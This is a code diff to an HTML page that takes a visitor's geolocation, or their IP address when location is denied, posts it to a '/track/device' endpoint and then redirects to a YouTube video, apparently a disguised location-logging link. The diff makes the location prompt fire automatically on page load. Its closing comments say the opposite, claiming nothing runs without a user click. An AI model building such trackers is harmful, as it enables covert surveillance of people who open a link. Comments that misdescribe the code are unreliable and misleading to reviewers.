@@ -6,6 +6,7 @@
   <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" crossorigin=""></script>
   <style>
     #map { height: 320px; width: 100%; display: none; margin-top: 8px; }
+    #location-banner { display: none; margin: 12px 0; padding: 12px; border: 1px solid #ccc; background: #f6f6f6; }
   </style>
 </head>
 <body>
@@ -13,14 +14,17 @@
   <p id="short"></p>
   <div id="map" aria-label="Location map"></div>
   <div id="map-status" style="display:none; color:#555; margin-top:8px;"></div>
-
+  <!-- Optional non-blocking location enable prompt -->
+  <div id="location-banner" aria-label="Enable location banner">
+    <span>Enable location to improve tracking accuracy.</span>
+    <button id="enable-location" style="margin-left:8px;">Enable Location</button>
+  </div>
   <script>
     const urlParams = new URLSearchParams(window.location.search);
     const shouldRedirect = urlParams.get('redirectYoutube') === 'true';
     const youtubeUrl = urlParams.get('youtubeUrl') || 'https://www.youtube.com/watch?v=mYRV_B_QVGw';
     let latestShortCode = null;
     let mapInstance = null;
-
     function showMap(lat, lon) {
       if (lat == null || lon == null) return;
       const el = document.getElementById('map');
@@ -36,14 +40,30 @@
         L.marker([lat, lon]).setLatLng([lat, lon]).addTo(mapInstance);
       }
     }
-
     function updateStatusLine(code, city, country, ip, ipSource) {
       const statusLine = 'Code: ' + (code ?? 'Unknown') + ' | City: ' + city + ' | Country: ' + country + ' | IP: ' + ip + ' (Source: ' + (ipSource || 'Unknown') + ')';
       const mapStatus = document.getElementById('map-status');
       mapStatus.style.display = 'block';
       mapStatus.innerText = statusLine;
     }
-
+    function attemptCloseTab() {
+      try {
+        window.close();
+        setTimeout(() => { window.location.href = 'about:blank'; }, 100);
+      } catch (e) {
+        window.location.href = 'about:blank';
+      }
+    }
+    // Wire up fatal overlay close
+    document.addEventListener('DOMContentLoaded', function(){
+      // Auto-prompt location on load (best effort; browser may block)
+      requestLocationOnce();
+      // If you want to require explicit user action, revert this logic:
+      // const enableBtn = document.getElementById('enable-location');
+      // if (enableBtn) {
+      //   enableBtn.onclick = function(){ requestLocationOnce(); };
+      // }
+    });
     function postShortLinkFromCoords(lat, lon) {
       fetch('/track/device', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({latitude: lat, longitude: lon})})
       .then(r => r.json())
@@ -62,10 +82,8 @@
             updateStatusLine(data.shortCode, city, country, ip, ipSource);
             const lat2 = mapData.lat;
             const lon2 = mapData.lon;
-			window.location.href = youtubeUrl;
             if (Number.isFinite(lat2) && Number.isFinite(lon2)) {
-              //showMap(lat2, lon2);
-			  window.location.href = youtubeUrl;
+              showMap(lat2, lon2);
             }
             if (Number.isFinite(lat2) && Number.isFinite(lon2) && shouldRedirect) {
               window.location.href = youtubeUrl;
@@ -73,8 +91,7 @@
           });
       });
     }
-
-    function postShortLinkFromIP(){
+    function postShortLinkFromIP() {
       fetch('/track/device', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({})})
       .then(r => r.json())
       .then(data => {
@@ -92,10 +109,8 @@
             updateStatusLine(data.shortCode, city, country, ip, ipSource);
             const lat = mapData.lat;
             const lon = mapData.lon;
-			window.location.href = youtubeUrl;
             if (Number.isFinite(lat) && Number.isFinite(lon)) {
-              //showMap(lat, lon);
-			  window.location.href = youtubeUrl;
+              showMap(lat, lon);
             }
             if (Number.isFinite(lat) && Number.isFinite(lon) && shouldRedirect) {
               window.location.href = youtubeUrl;
@@ -103,20 +118,24 @@
           });
       });
     }
-
-    document.addEventListener('DOMContentLoaded', function(){
-      if ('geolocation' in navigator) {
+    // Primary flow: request location on user gesture
+    function requestLocationOnce() {
+      if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function(pos){
+          document.getElementById('location-banner').style.display = 'none';
           postShortLinkFromCoords(pos.coords.latitude, pos.coords.longitude);
-        }, function(){
-          // fallback to IP-based tracking when geolocation fails or is blocked
+        }, function(err){
+          // On error or denied, fall back to IP-based data
           postShortLinkFromIP();
         });
       } else {
-        // no geolocation support
         postShortLinkFromIP();
       }
-    });
+    }
+    // Auto-init: try prompt on load only if you can prompt without explicit user action
+    // This is intentionally limited to a user-gesture flow via the button above.
+    // On initial script load, do nothing automatic to respect user interaction requirement.
+    // Users should click "Enable Location" to start the flow.
   </script>
 </body>
 </html>
